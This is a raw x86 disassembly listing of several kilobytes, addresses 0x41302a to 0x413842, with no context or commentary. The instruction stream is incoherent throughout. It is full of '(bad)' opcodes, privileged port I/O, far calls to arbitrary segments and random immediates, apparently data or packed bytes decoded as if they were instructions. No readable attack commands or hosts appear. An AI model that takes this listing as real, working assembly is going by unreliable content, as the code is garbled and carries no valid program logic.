  41302a:	arpl   WORD PTR [edx+0x134a5f8e],sp
  413030:	(bad)  
  413031:	pusha  
  413032:	jecxz  0x413024
  413034:	pop    es
  413035:	loop   0x4130a5
  413037:	adc    ebp,DWORD PTR [ebp+0x2caaf8c2]
  41303d:	push   edi
  41303e:	adc    dh,bh
  413040:	pushf  
  413041:	ins    BYTE PTR es:[edi],dx
  413042:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413043:	pushf  
  413044:	rcr    DWORD PTR [edx-0xa01d7f9],1
  41304a:	mov    ah,0x33
  41304c:	icebp  
  41304d:	iret   
  41304e:	xor    eax,DWORD PTR [edi+0x2d608a23]
  413054:	jns    0x4130c6
  413056:	xor    bh,0x4d
  413059:	add    bl,BYTE PTR [esi+0x4a]
  41305c:	out    0x4e,al
  41305e:	out    0x46,al
  413060:	pusha  
  413061:	mov    dl,0xc8
  413063:	pop    ebx
  413064:	and    al,0xf4
  413066:	out    0xaa,eax
  413068:	retf   0xc896
  41306b:	cmp    dh,al
  41306d:	pusha  
  41306e:	cs das 
  413070:	mov    esp,0xa1292824
  413075:	ror    DWORD PTR [edx-0xdfad3c],cl
  41307b:	rol    edi,cl
  41307d:	xchg   esp,eax
  41307e:	mov    ebx,0x8cc8131
  413083:	sbb    eax,0xc5d7c5e9
  413088:	ins    BYTE PTR es:[edi],dx
  413089:	adc    DWORD PTR [ecx+0x1d],edi
  41308c:	mov    ah,0x70
  41308e:	adc    edx,DWORD PTR [esi+0x38c59d11]
  413094:	dec    esi
  413095:	loope  0x413040
  413097:	or     al,0x2e
  413099:	int3   
  41309a:	push   edi
  41309b:	(bad)  
  41309c:	gs jecxz 0x413105
  41309f:	pop    esp
  4130a0:	pushf  
  4130a1:	mov    ds:0x61e95942,al
  4130a6:	or     dh,dh
  4130a8:	add    ecx,DWORD PTR [ebx-0x54]
  4130ab:	sbb    BYTE PTR [eax],bl
  4130ad:	(bad)  
  4130af:	cmp    BYTE PTR [edi+0x70],dl
  4130b2:	rcl    eax,0x3e
  4130b5:	push   0x94f0e396
  4130ba:	sbb    DWORD PTR [esi-0x7099e4d3],eax
  4130c0:	adc    BYTE PTR [edx],ah
  4130c2:	or     al,BYTE PTR [ecx-0x743fe1a7]
  4130c8:	mov    al,0x1c
  4130ca:	add    al,0x37
  4130cc:	mov    dl,dl
  4130ce:	and    BYTE PTR [ecx],ch
  4130d0:	in     al,dx
  4130d1:	iret   
  4130d2:	data16 aad 0x5a
  4130d5:	loope  0x413128
  4130d7:	xchg   esp,eax
  4130d8:	push   cs
  4130d9:	and    DWORD PTR [ecx-0x1eaef5ad],esi
  4130df:	sbb    ah,bl
  4130e1:	sub    al,0xc8
  4130e3:	out    0x1b,al
  4130e5:	mov    WORD PTR [edx-0x2da94dce],?
  4130eb:	fdivr  st,st(1)
  4130ed:	pop    edi
  4130ee:	lds    esp,FWORD PTR [ecx]
  4130f0:	and    DWORD PTR [edx],esp
  4130f2:	in     al,0xcc
  4130f4:	shl    BYTE PTR [esp+ecx*1-0xc5dbbad],1
  4130fb:	rcl    esp,1
  4130fd:	xor    al,BYTE PTR [ebp-0x2]
  413100:	or     ecx,DWORD PTR [edi]
  413102:	push   es
  413103:	push   0x3c71b4ac
  413108:	push   0x19f3db8b
  41310d:	(bad)
  413111:	inc    esi
  413112:	xchg   esi,eax
  413113:	inc    BYTE PTR [ebp+0x66b7aaac]
  413119:	(bad)  
  41311a:	cmp    eax,0x610ecb5a
  41311f:	lahf   
  413120:	ins    DWORD PTR es:[edi],dx
  413121:	arpl   WORD PTR [edi],sp
  413123:	inc    ebx
  413124:	add    DWORD PTR [edi+0x12],esi
  413127:	add    al,0xdd
  413129:	sbb    eax,0x9bf8a449
  41312e:	or     ch,BYTE PTR [esi+ecx*4-0x7efd502a]
  413135:	lock stc 
  413137:	mov    fs,WORD PTR [eax]
  413139:	sub    edx,eax
  41313b:	lods   al,BYTE PTR ds:[esi]
  41313c:	adc    eax,esp
  41313e:	push   ebp
  41313f:	push   ecx
  413140:	in     al,0x1
  413142:	mov    WORD PTR [esi],ss
  413144:	mov    al,ds:0xe2484250
  413149:	or     cl,BYTE PTR [esi+0x5]
  41314c:	mov    esi,0xd7701bd
  413151:	mov    esp,0xe815bed3
  413156:	fwait
  413157:	xor    BYTE PTR [ecx+0x12],0x23
  41315b:	add    eax,0xb9640251
  413160:	fcom   QWORD PTR [ebp+0x76]
  413163:	inc    edi
  413164:	iret   
  413165:	(bad)  
  413166:	inc    ecx
  413167:	jo     0x41311d
  413169:	das    
  41316a:	push   0x71
  41316c:	sahf   
  41316d:	dec    ebp
  41316e:	inc    ebx
  41316f:	fmul   DWORD PTR [ecx+edi*2-0x61]
  413173:	mov    bh,0x4e
  413175:	jge    0x413163
  413177:	sahf   
  413178:	sub    BYTE PTR [esp+eax*8-0x2cfc8c10],bl
  41317f:	inc    ebx
  413180:	imul   ebp,DWORD PTR [edi+esi*1],0xffffff8e
  413184:	retf   
  413185:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413186:	sub    BYTE PTR [edi],ch
  413188:	aaa    
  413189:	mov    ds:0xba593843,eax
  41318e:	dec    edi
  41318f:	and    al,0x79
  413191:	jmp    0x49861edc
  413196:	xchg   edx,eax
  413197:	cmp    dl,cl
  413199:	sbb    DWORD PTR [esi-0x58a4fd19],ecx
  41319f:	in     al,dx
  4131a0:	and    bl,0x82
  4131a3:	std    
  4131a4:	(bad)  
  4131a5:	pop    ebx
  4131a6:	loopne 0x413175
  4131a8:	or     al,BYTE PTR [eax]
  4131aa:	ss test esi,edx
  4131ad:	bound  ecx,QWORD PTR [edx+0x39463cac]
  4131b3:	mov    ecx,0x9015f22d
  4131b8:	rcr    DWORD PTR [ebx+ecx*2-0x2e],cl
  4131bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4131bd:	pop    ebx
  4131be:	mov    BYTE PTR [edi*4-0x55379c79],dl
  4131c5:	fdivr  QWORD PTR [eax+0x28858b38]
  4131cb:	mov    al,0x4f
  4131cd:	sub    eax,0x62173096
  4131d2:	sbb    eax,0x62d302d3
  4131d7:	pop    es
  4131d8:	inc    esp
  4131d9:	idiv   bl
  4131db:	mov    esp,0x756195f3
  4131e0:	mov    ah,0x9f
  4131e2:	(bad)  
  4131e3:	mov    eax,0xb9320f90
  4131e8:	sbb    DWORD PTR [edi-0x7bd0f8f],eax
  4131ee:	mov    al,0xf6
  4131f0:	mov    edi,0xd36e4b07
  4131f5:	rcl    DWORD PTR [edx+eiz*8-0x22],0x5e
  4131fa:	or     esi,esi
  4131fc:	dec    ebp
  4131fe:	inc    ebx
  4131ff:	enter  0x3ebb,0xa7
  413203:	mov    al,0x38
  413205:	push   esi
  413206:	into   
  413207:	or     eax,0xba52ef21
  41320c:	data16 jecxz 0x4131d1
  41320f:	loop   0x413244
  413211:	cli    
  413212:	jae    0x41320b
  413214:	pop    ss
  413215:	cs (bad) 
  413217:	dec    esi
  413218:	and    eax,0xcd9fb58a
  41321d:	ret    0x5c0b
  413220:	mov    eax,0x39368dc8
  413225:	pop    esi
  413226:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  413228:	in     al,dx
  413229:	ds xchg ebp,eax
  41322b:	addr16 push edi
  41322d:	dec    esi
  41322e:	sti    
  41322f:	iret   
  413230:	and    DWORD PTR [esi],ecx
  413232:	repnz out dx,eax
  413234:	sbb    bh,cl
  413236:	addr16 jo 0x41327d
  413239:	mov    esi,0xec6eb781
  41323e:	xchg   bl,dl
  413240:	pop    ebx
  413241:	inc    edi
  413242:	pop    eax
  413243:	fmulp  st(2),st
  413245:	enter  0xebb5,0x45
  413249:	pop    ebx
  41324a:	mov    cl,0xe4
  41324c:	ret    0x1e25
  41324f:	mov    DWORD PTR [edi-0x2d384b24],edi
  413255:	iret   
  413256:	loop   0x4132cc
  413258:	aad    0x58
  41325a:	sbb    edx,DWORD PTR [ebp-0x49a026b4]
  413260:	aad    0xfe
  413262:	cwde   
  413263:	mov    ebx,0xad5fd552
  413268:	js     0x4132c3
  41326a:	in     al,0x5b
  41326c:	and    DWORD PTR [ebx-0x43],eax
  41326f:	xchg   ebx,eax
  413270:	ds pop ecx
  413272:	push   cs
  413273:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413274:	dec    edx
  413275:	cs scas eax,DWORD PTR es:[edi]
  413277:	dec    edx
  413278:	cwde   
  413279:	rcl    BYTE PTR [edx+0x7d],1
  41327c:	xlat   BYTE PTR ds:[ebx]
  41327d:	pusha  
  41327e:	inc    ebp
  41327f:	add    BYTE PTR [edi-0x26],dh
  413282:	add    BYTE PTR [esi-0x10],dl
  413285:	xor    BYTE PTR [ebp+eax*2-0x13],0x67
  41328a:	cmp    ebx,edx
  41328c:	pushf  
  41328d:	fidivr WORD PTR [esi+0x47]
  413290:	cs test eax,0xfccc97de
  413296:	xchg   BYTE PTR [ebx],cl
  413298:	mov    al,ds:0xc1edef58
  41329d:	sbb    edx,DWORD PTR [ebx]
  41329f:	cdq    
  4132a0:	push   0x733d827c
  4132a5:	and    esi,DWORD PTR [ecx]
  4132a7:	jbe    0x4132c8
  4132a9:	dec    esp
  4132aa:	jno    0x413277
  4132ac:	inc    ecx
  4132ad:	je     0x41328b
  4132af:	(bad)  
  4132b0:	cli    
  4132b1:	adc    DWORD PTR [edi+esi*2],edi
  4132b4:	fcomp  DWORD PTR [ecx+0x50]
  4132b7:	jb     0x413337
  4132b9:	cmp    DWORD PTR [edi],0x4e7a9f15
  4132bf:	push   esi
  4132c0:	enter  0x392c,0x19
  4132c4:	cs gs push eax
  4132c7:	and    eax,0x68a7878
  4132cc:	mov    ch,bl
  4132ce:	cld    
  4132cf:	ss mov edi,0x11c6d21d
  4132d5:	scas   al,BYTE PTR es:[edi]
  4132d6:	retf   
  4132d7:	mov    ds:0x7cc6f23a,eax
  4132dc:	sbb    bl,0x72
  4132df:	dec    ebp
  4132e0:	sbb    al,dh
  4132e2:	cli    
  4132e3:	call   0x7aa33bd6
  4132e8:	push   ecx
  4132e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4132ea:	mov    ebp,0xcd9506e7
  4132ef:	lods   eax,DWORD PTR ds:[esi]
  4132f0:	test   BYTE PTR [esi-0x51b9ffee],0x5
  4132f7:	push   0xb2e1a6b9
  4132fc:	test   BYTE PTR [eax],al
  4132fe:	shl    ecx,1
  413300:	vprotq xmm13,[ebx-0x3f42e0d2],xmm0
  413309:	xor    esp,ebp
  41330b:	jnp    0x41332d
  41330d:	gs push es
  41330f:	(bad)  
  413310:	dec    ebp
  413311:	jle    0x41332b
  413313:	mov    ds:0x4e13e596,eax
  413318:	mov    esi,0x91128e79
  41331d:	push   edx
  41331e:	fwait
  41331f:	ins    BYTE PTR es:[edi],dx
  413320:	call   0xe63d:0xa766424
  413327:	and    al,0x11
  413329:	addr16 jns 0x4132b7
  41332c:	mov    ds:0x4e76a88e,eax
  413331:	adc    cl,bl
  413333:	jo     0x413309
  413335:	xchg   BYTE PTR [ebx],al
  413337:	push   DWORD PTR [ebx+0x2055a6c]
  41333d:	mov    ds:0x45cbc621,al
  413342:	je     0x41330a
  413344:	inc    DWORD PTR [edx+0x5118b5af]
  41334a:	in     eax,0x98
  41334c:	imul   BYTE PTR [edx+0x12]
  41334f:	popf   
  413350:	fist   DWORD PTR [ebx]
  413352:	mov    al,ds:0xda934c46
  413357:	sub    cl,BYTE PTR [ebx-0x68]
  41335a:	in     al,0x6c
  41335c:	sbb    DWORD PTR [ebx+eiz*8+0x5c7b07be],ecx
  413363:	call   0x2807:0xb216d067
  41336a:	dec    esi
  41336b:	pop    edi
  41336c:	cmp    dl,ch
  41336e:	adc    esi,DWORD PTR [ebx-0x18]
  413371:	popa   
  413372:	mov    ah,0xd5
  413374:	or     dh,BYTE PTR [edi]
  413376:	push   ebp
  413377:	repz push ebp
  413379:	dec    edx
  41337a:	ja     0x4133e4
  41337c:	or     BYTE PTR [ebx],al
  41337e:	cdq    
  41337f:	mov    ss,WORD PTR [edi-0xf]
  413382:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413383:	cdq    
  413384:	aas    
  413385:	retf   
  413386:	pop    esp
  413387:	das    
  413388:	mov    ebp,0x35f4cd10
  41338d:	mov    eax,ds:0xe4084845
  413392:	idiv   al
  413394:	stc    
  413395:	mov    ecx,0x23dbad9b
  41339a:	or     eax,0x17a77285
  41339f:	xchg   edx,eax
  4133a0:	cmc    
  4133a1:	jmp    0x41341a
  4133a3:	dec    ebx
  4133a4:	mov    ecx,0xc0743cf2
  4133a9:	cli    
  4133aa:	mov    eax,fs
  4133ac:	add    BYTE PTR [eax+0x19c99eb8],bl
  4133b2:	and    al,BYTE PTR ds:0x24e307d6
  4133b8:	iret   
  4133b9:	pop    esi
  4133ba:	add    ebx,edi
  4133bc:	(bad)  
  4133be:	and    al,BYTE PTR [edx]
  4133c0:	fsub   st(4),st
  4133c2:	sbb    eax,0x31146f7
  4133c7:	into   
  4133c8:	and    eax,DWORD PTR [edx-0x7a]
  4133cb:	icebp  
  4133cc:	ds mov edx,0xe017e6d5
  4133d2:	sub    al,0x9b
  4133d4:	jp     0x4133f2
  4133d6:	aad    0x69
  4133d8:	push   edi
  4133d9:	sub    ah,BYTE PTR [esi-0x5e]
  4133dc:	pop    ds
  4133dd:	mov    ebp,0xa7a8d5f6
  4133e2:	test   eax,0xa07009a3
  4133e7:	mov    cl,0xcc
  4133e9:	stos   DWORD PTR es:[edi],eax
  4133ea:	dec    DWORD PTR [eax-0x41]
  4133ed:	loopne 0x4133f3
  4133ef:	xchg   DWORD PTR [ecx+0x67509e53],edi
  4133f5:	xchg   bp,ax
  4133f7:	jns    0x4133fb
  4133f9:	pop    ebx
  4133fa:	push   cs
  4133fb:	nop
  4133fc:	inc    esp
  4133fd:	stos   BYTE PTR es:[edi],al
  4133fe:	push   0xbd13ba6
  413403:	add    eax,0x43e7b955
  413408:	jnp    0x41347a
  41340a:	lods   eax,DWORD PTR ds:[esi]
  41340b:	lock sbb bh,BYTE PTR [ebx]
  41340e:	xchg   esp,eax
  41340f:	or     BYTE PTR [eax-0x16c21a6f],0x79
  413416:	mov    ch,0xa6
  413418:	enter  0xf86a,0x66
  41341c:	push   ss
  41341d:	and    eax,0x237e93b2
  413422:	sti    
  413423:	ds cmp al,0xf0
  413426:	pop    ebx
  413427:	sbb    edx,DWORD PTR [ebp-0x2a]
  41342a:	icebp  
  41342b:	jge    0x413431
  41342d:	dec    esi
  41342e:	cmp    al,0xb
  413430:	xchg   DWORD PTR [ebx-0x2c],edx
  413433:	mov    esi,0x4c58d521
  413438:	scas   al,BYTE PTR es:[edi]
  413439:	test   DWORD PTR [ecx-0x599805d2],eax
  41343f:	mov    al,0xc0
  413441:	ins    DWORD PTR es:[edi],dx
  413442:	push   edx
  413443:	mov    DWORD PTR [edi],esp
  413445:	adc    eax,0xaf81b661
  41344a:	adc    dh,BYTE PTR [ecx]
  41344c:	pop    esi
  41344d:	push   ebx
  41344e:	test   DWORD PTR [eax],ecx
  413450:	jmp    DWORD PTR [ebx+0xdd248b4]
  413456:	or     ebp,ecx
  413458:	ds pusha 
  41345a:	sti    
  41345b:	daa    
  41345c:	pushf  
  41345d:	xchg   esp,eax
  41345e:	lock fwait
  413460:	adc    DWORD PTR [edi],ebp
  413462:	cli    
  413463:	cmp    DWORD PTR [edx-0x23],ebp
  413466:	sbb    cl,BYTE PTR [edi+0x4e462caf]
  41346c:	cmp    BYTE PTR [edi+ebx*2+0xd],dh
  413470:	mov    cs,WORD PTR ds:0x92fd3820
  413476:	stos   DWORD PTR es:[edi],eax
  413477:	outs   dx,DWORD PTR ds:[esi]
  413478:	pusha  
  413479:	inc    ebx
  41347a:	pop    esp
  41347b:	jg     0x4134b7
  41347d:	call   0xdf67:0x16863e1e
  413484:	adc    DWORD PTR [edi],esi
  413486:	test   al,0xaa
  413488:	push   ebx
  413489:	inc    ecx
  41348a:	lea    esp,[esi+edi*2-0x717d79e7]
  413491:	jmp    0x10d6:0xecfe3621
  413498:	daa    
  413499:	or     DWORD PTR [ebx+0x5477db13],0xffffffc1
  4134a0:	and    eax,0x2e8ea5ae
  4134a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4134a6:	gs cmp dh,bl
  4134a9:	popf   
  4134aa:	xchg   DWORD PTR [edx+0x641e56c],esp
  4134b0:	jbe    0x4134f7
  4134b2:	cmp    al,0x3
  4134b4:	sub    BYTE PTR [eax+0x7a],al
  4134b7:	mov    bl,0xdc
  4134b9:	fild   DWORD PTR [edx+0x5e49690e]
  4134bf:	test   DWORD PTR [edx],0xe4bcf498
  4134c5:	das    
  4134c6:	pop    es
  4134c7:	std    
  4134c8:	mov    esi,0x222fabf4
  4134cd:	mov    cl,0x95
  4134cf:	aas    
  4134d0:	js     0x413496
  4134d2:	aam    0xb0
  4134d4:	loop   0x41352a
  4134d6:	(bad)  
  4134d7:	cs add BYTE PTR fs:[ecx+edx*8-0x21],bl
  4134dd:	add    esp,DWORD PTR [ebx]
  4134df:	and    BYTE PTR [edx],cl
  4134e1:	sbb    edx,DWORD PTR [esp+ebp*1]
  4134e4:	leave  
  4134e5:	xchg   esi,eax
  4134e6:	xchg   edi,eax
  4134e7:	outs   dx,BYTE PTR ds:[esi]
  4134e8:	cmp    esi,eax
  4134ea:	popf   
  4134eb:	std    
  4134ec:	cld    
  4134ed:	rcr    BYTE PTR [esi+0x43],1
  4134f0:	push   esi
  4134f2:	jno    0x4134c8
  4134f4:	jo     0x4134de
  4134f6:	and    al,0xd3
  4134f8:	mov    bl,0x66
  4134fa:	jle    0x4134c3
  4134fc:	ja     0x41356d
  4134fe:	mov    ah,0xd
  413500:	jno    0x4134ed
  413502:	test   DWORD PTR [ecx-0x607bac7c],esi
  413508:	adc    eax,DWORD PTR [edx-0x5e267625]
  41350e:	stos   BYTE PTR es:[edi],al
  41350f:	loope  0x4134f4
  413511:	pop    ss
  413512:	inc    esi
  413513:	cmp    eax,0x2bcb4445
  413518:	enter  0x1e59,0x3
  41351c:	cmp    eax,DWORD PTR [edi+0x5b3b5936]
  413522:	cmp    esp,esp
  413524:	sub    eax,0x80c6b3e4
  413529:	aad    0x17
  41352b:	(bad)  
  41352c:	or     cl,ch
  41352e:	(bad)  
  41352f:	pop    eax
  413530:	imul   eax,DWORD PTR [eax],0xffffffca
  413533:	add    ecx,DWORD PTR [esi+edx*1+0x6e933748]
  41353a:	and    al,BYTE PTR [ebx-0xb13fc0b]
  413540:	mov    ebx,0xbd8dbc38
  413545:	sbb    eax,0x3fa968be
  41354a:	adc    al,0xaf
  41354c:	push   esp
  41354d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41354e:	aam    0x3
  413550:	dec    ebx
  413551:	fiadd  WORD PTR [edi*1+0x757887d6]
  413558:	pusha  
  413559:	push   edx
  41355a:	push   ecx
  41355b:	push   es
  41355c:	mov    eax,0x5ec91b92
  413561:	cld    
  413562:	loop   0x41359f
  413564:	cld    
  413565:	fiadd  WORD PTR [edx+0x1ac895e]
  41356b:	sti    
  41356c:	pop    eax
  41356d:	mov    BYTE PTR [eax-0x3785ec04],cl
  413573:	div    DWORD PTR [ebp+edi*1+0x31]
  413577:	and    al,0x21
  413579:	push   ss
  41357a:	je     0x413591
  41357c:	xchg   ecx,eax
  41357d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41357e:	mov    al,0xa6
  413580:	out    dx,eax
  413581:	sbb    ebp,DWORD PTR [edx]
  413583:	add    eax,0xfe1a0f90
  413588:	mov    dl,0x28
  41358a:	dec    esp
  41358b:	shl    ecx,1
  41358d:	fmul   QWORD PTR [edi+0x73d7955d]
  413593:	ret    
  413594:	cmc    
  413595:	hlt    
  413596:	push   es
  413597:	pushf  
  413598:	scas   al,BYTE PTR es:[edi]
  413599:	push   ebp
  41359a:	mov    bl,0x4f
  41359c:	pop    esp
  41359d:	jae    0x413528
  41359f:	dec    esi
  4135a0:	lea    ebp,[ecx+0x1da8b9f5]
  4135a6:	scas   al,BYTE PTR es:[edi]
  4135a7:	icebp  
  4135a8:	stos   DWORD PTR es:[edi],eax
  4135a9:	cs ror edi,cl
  4135ac:	xchg   DWORD PTR [eax-0x8c9fa82],ecx
  4135b2:	mov    al,0x68
  4135b4:	cld    
  4135b5:	inc    eax
  4135b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4135b7:	outs   dx,DWORD PTR ds:[esi]
  4135b8:	je     0x413587
  4135ba:	out    dx,al
  4135bb:	rcl    BYTE PTR [esi+0x348630ea],cl
  4135c1:	dec    edx
  4135c2:	xchg   edx,eax
  4135c3:	cmp    bh,cl
  4135c5:	xor    esp,edx
  4135c7:	pusha  
  4135c8:	sub    bl,BYTE PTR [esi-0x2d]
  4135cb:	pop    es
  4135cc:	pop    ebp
  4135cd:	jne    0x4135f7
  4135cf:	cs xchg ebx,eax
  4135d1:	fxam   
  4135d3:	ins    BYTE PTR es:[edi],dx
  4135d4:	mov    ch,0x48
  4135d6:	ret    0x997c
  4135d9:	jno    0x41358f
  4135db:	sub    eax,0xbc256c7b
  4135e0:	rcl    DWORD PTR [eax-0x5e04045b],0xba
  4135e7:	sbb    ecx,DWORD PTR [esi+0x6ae06756]
  4135ed:	out    0xdb,al
  4135ef:	dec    ebp
  4135f0:	mov    fs,esp
  4135f2:	mov    eax,ds:0xb4f29f2d
  4135f7:	dec    eax
  4135f8:	sub    BYTE PTR [ebx],bh
  4135fa:	xchg   bh,bh
  4135fc:	push   edi
  4135fd:	pop    esp
  4135fe:	and    DWORD PTR [ebx+edi*8-0x4e7789d4],edi
  413605:	mov    esp,0x706ec69a
  41360a:	pop    esi
  41360b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41360c:	inc    BYTE PTR [ebx]
  41360e:	aaa    
  41360f:	mov    edi,0x474256f1
  413614:	sbb    ah,ch
  413616:	fcom   st(3)
  413618:	ret    
  413619:	mov    ebp,0x9519f174
  41361e:	dec    edx
  41361f:	aas    
  413620:	lea    ecx,[ecx+0x4c8cb06a]
  413626:	mov    bl,0xa7
  413628:	push   0x1d
  41362a:	pop    esp
  41362b:	mov    bh,0xcc
  41362d:	inc    ecx
  41362e:	mov    DWORD PTR [ebx-0x2952060d],esi
  413634:	or     al,0x76
  413636:	sub    BYTE PTR [edx-0x5d09454],dh
  41363c:	cmc    
  41363d:	xor    al,0x1d
  41363f:	addr16 imul ebp,ebx,0xffffffd6
  413643:	or     dh,ah
  413645:	sbb    DWORD PTR [ebp+eiz*8+0xb977738],ebx
  41364c:	cmp    eax,0x5af62192
  413651:	cmp    eax,0xe9b2611e
  413656:	aam    0xb3
  413658:	aam    0x3f
  41365a:	xlat   BYTE PTR ds:[ebx]
  41365b:	add    eax,0x8501b787
  413660:	daa    
  413661:	push   eax
  413662:	or     eax,esp
  413664:	aas    
  413665:	je     0x413634
  413667:	dec    DWORD PTR [edx+edi*4+0x7f]
  41366b:	repz mov al,0x7c
  41366e:	cmc    
  41366f:	ror    ch,1
  413671:	mov    esp,0xd29fa26
  413676:	icebp  
  413677:	push   ebp
  413678:	push   0x3bf4d7f9
  41367d:	jae    0x413643
  41367f:	xor    eax,0x2716b947
  413684:	bound  eax,QWORD PTR [ebx+0x8]
  413687:	xor    bl,dh
  413689:	call   0x98ae:0xa594ddf1
  413690:	pop    edi
  413691:	or     DWORD PTR [esi],ebx
  413693:	jmp    0xa38d:0x8d998e9
  41369a:	add    bl,ch
  41369c:	mov    bl,0x57
  41369e:	jecxz  0x413672
  4136a0:	mov    edx,0xd6dd6187
  4136a5:	aaa    
  4136a6:	mov    ah,0xb6
  4136a8:	mov    bl,0xe0
  4136aa:	enter  0x46dc,0x4e
  4136ae:	inc    ebx
  4136b0:	add    DWORD PTR [esi+eiz*1+0x277de73a],esi
  4136b7:	bound  ebp,QWORD PTR [ebx-0xe90a4a2]
  4136bd:	(bad)  
  4136be:	pop    eax
  4136bf:	xor    bh,BYTE PTR [eax+0x2d]
  4136c2:	add    eax,0x19285c6
  4136c7:	scas   al,BYTE PTR es:[edi]
  4136c8:	retf   
  4136c9:	sti    
  4136ca:	push   es
  4136cb:	repz js 0x4136a2
  4136ce:	mov    ah,ch
  4136d0:	xchg   esp,eax
  4136d1:	out    0xbb,eax
  4136d3:	mov    ebp,0x86b654f
  4136d8:	gs stos BYTE PTR es:[edi],al
  4136da:	sub    al,0x7b
  4136dc:	jo     0x41368f
  4136de:	fsubp  st(3),st
  4136e0:	push   es
  4136e1:	inc    ebx
  4136e2:	and    BYTE PTR [ecx+0xc],cl
  4136e5:	inc    esi
  4136e6:	sbb    eax,0xe2314147
  4136eb:	adc    ecx,DWORD PTR [ecx+0x4]
  4136ee:	mov    esp,0xc4d81cce
  4136f3:	adc    eax,0xc92001db
  4136f8:	aam    0xd7
  4136fa:	push   0xf75cff45
  4136ff:	push   edi
  413700:	ss fcmovnbe st,st(0)
  413703:	or     eax,0xcfbc7eb2
  413708:	(bad)  
  413709:	popf   
  41370a:	arpl   WORD PTR [edx-0x4ae4ce6],dx
  413710:	nop
  413711:	popa   
  413712:	push   ecx
  413713:	dec    edi
  413714:	pop    edx
  413715:	push   eax
  413716:	push   ebp
  413717:	cwde   
  413718:	xor    esi,ecx
  41371a:	pop    ecx
  41371b:	dec    ecx
  41371c:	sbb    eax,ebp
  41371e:	outs   dx,BYTE PTR ds:[esi]
  41371f:	rol    DWORD PTR [esi-0x759aec2c],1
  413725:	sub    ecx,edi
  413727:	iret   
  413728:	or     bl,BYTE PTR [ebp+0x68cf69ab]
  41372e:	sti    
  41372f:	inc    edi
  413730:	outs   dx,DWORD PTR ds:[esi]
  413731:	fwait
  413732:	push   edx
  413733:	mov    esp,0xa9771a26
  413738:	femms  
  41373a:	xchg   esi,eax
  41373b:	cld    
  41373c:	xchg   dl,cl
  41373e:	xor    bl,dl
  413740:	pop    edi
  413741:	jne    0x413723
  413743:	shr    eax,1
  413745:	sbb    eax,0x38a4517d
  41374a:	inc    ecx
  41374b:	std    
  41374c:	inc    edi
  41374d:	pop    edx
  41374e:	lods   eax,DWORD PTR ds:[esi]
  41374f:	xchg   ecx,eax
  413750:	mov    dl,0x3c
  413752:	mov    ds:0x91915f3a,eax
  413757:	mov    edi,esp
  413759:	or     ah,dh
  41375b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41375c:	add    dl,BYTE PTR [edi+0x4d]
  41375f:	pop    esp
  413760:	mov    dh,0x3c
  413762:	mov    esp,0x356c326e
  413767:	clc    
  413768:	pusha  
  413769:	xchg   edx,eax
  41376a:	hlt    
  41376b:	iret   
  41376c:	test   eax,0x84f5cd04
  413771:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413772:	dec    ecx
  413773:	vmwrite edx,DWORD PTR ds:0x577d5d83
  41377a:	popa   
  41377b:	retf   
  41377c:	ret    0x9885
  41377f:	dec    ebp
  413780:	test   BYTE PTR [ecx],dh
  413782:	xor    al,bl
  413784:	sbb    cl,BYTE PTR [ebx+eax*1+0x4c]
  413788:	xor    ebx,edi
  41378a:	inc    ebp
  41378b:	fisubr DWORD PTR [eax+0x78]
  41378e:	or     eax,0x23aa92c1
  413793:	nop
  413794:	jno    0x413748
  413796:	in     al,0x3
  413798:	push   ss
  413799:	imul   edi,DWORD PTR [esi-0x48],0x1f402580
  4137a0:	jecxz  0x4137e4
  4137a2:	push   ss
  4137a3:	pop    ds
  4137a4:	dec    eax
  4137a5:	push   ebp
  4137a6:	mov    ds:0x6fb39148,al
  4137ab:	fs dec edi
  4137ad:	out    0x4d,eax
  4137af:	enter  0x318a,0xb4
  4137b3:	sub    ebx,esi
  4137b5:	call   0xc9c543ae
  4137ba:	xchg   esi,eax
  4137bb:	fadd   DWORD PTR [esi]
  4137bd:	or     al,0x8
  4137bf:	rol    DWORD PTR [ebp-0x4d1f38c9],1
  4137c5:	jo     0x41378b
  4137c7:	loop   0x4137dd
  4137c9:	xor    eax,0x45ce9aba
  4137ce:	sar    dl,1
  4137d0:	cmp    dh,ah
  4137d2:	std    
  4137d3:	daa    
  4137d4:	push   eax
  4137d5:	pusha  
  4137d6:	out    dx,eax
  4137d7:	add    eax,0x61588b34
  4137dc:	arpl   sp,bp
  4137de:	std    
  4137df:	cmp    BYTE PTR [edx+0x61],0x17
  4137e3:	push   edi
  4137e4:	lock inc ebx
  4137e6:	lds    eax,FWORD PTR [esi]
  4137e8:	mov    dl,0xb3
  4137ea:	popf   
  4137eb:	inc    edx
  4137ec:	xor    DWORD PTR [ebp-0x68],ecx
  4137ef:	mov    ebx,0x1aecc1a8
  4137f4:	add    BYTE PTR [edi+0x3a4e246c],al
  4137fa:	xchg   esp,eax
  4137fb:	sbb    al,0xe0
  4137fd:	gs inc ebx
  4137ff:	and    eax,0x5bd6f129
  413804:	add    BYTE PTR [eax-0x567b0b03],0x85
  41380b:	ror    ebp,1
  41380d:	loop   0x4137da
  41380f:	adc    DWORD PTR [edx+0x5e95bf96],edx
  413815:	in     eax,0xee
  413817:	lar    edx,di
  41381a:	jo     0x41385d
  41381c:	test   al,0x37
  41381e:	daa    
  41381f:	scas   al,BYTE PTR es:[edi]
  413820:	xchg   edi,eax
  413821:	in     eax,dx
  413822:	push   ss
  413823:	mov    esp,ecx
  413825:	cdq    
  413826:	or     ah,BYTE PTR ds:0x44a674dc
  41382c:	or     BYTE PTR [eax-0x72297a03],bh
  413832:	aam    0xec
  413834:	jmp    0x41387e
  413836:	shl    DWORD PTR [edi+0x4f30ed55],0xcd
  41383d:	xchg   esi,eax
  41383e:	into   
  41383f:	add    ecx,DWORD PTR [edi+0x75]
  413842:	push   esp
